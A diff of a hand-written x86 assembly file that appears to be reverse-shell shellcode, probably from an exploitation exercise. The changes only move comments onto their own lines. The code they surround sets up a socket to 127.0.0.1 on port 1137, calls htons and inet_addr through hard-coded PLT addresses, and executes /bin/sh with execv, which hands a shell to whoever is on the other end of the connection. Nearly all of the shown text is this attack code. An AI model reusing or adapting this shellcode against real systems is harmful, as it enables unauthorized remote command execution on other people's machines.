@@ -21,7 +21,8 @@ add esp, 0x10
 mov    DWORD PTR [ebp-0xc],eax
 mov    WORD PTR [ebp-0x1c],0x2
 sub    esp,0xc
-push   0x539 /* This is the value of PORT number 1137 in decimal = 0x539 in hex */
+push   0x539
+/* This is the value of PORT number 1137 in decimal = 0x539 in hex */
 
 mov edx, 0x08048640 /* address of htons@plt */
 call   edx 
@@ -31,7 +32,8 @@ mov    WORD PTR [ebp-0x1a],ax
 sub    esp,0xc
 
 JMP _WANT_IP_ADD
-_GOT_IP_ADD: /* now we have on top of the stack the pointer to the string 127.0.0.1 */
+_GOT_IP_ADD:
+/* now we have on top of the stack the pointer to the string 127.0.0.1 */
 mov edx, 0x08048740 /* address of inet_addr@plt */
 call edx
 
@@ -77,7 +79,8 @@ lea    eax,[ebp-0x20]
 push   eax
 
 JMP _WANT_BIN_BASH
-_GOT_BIN_BASH: /* now we have on top of the stack the pointer to the string /bin/sh */
+_GOT_BIN_BASH:
+/* now we have on top of the stack the pointer to the string /bin/sh */
 
 mov edx, 0x080486d0 /* address of execv@plt */
 call edx
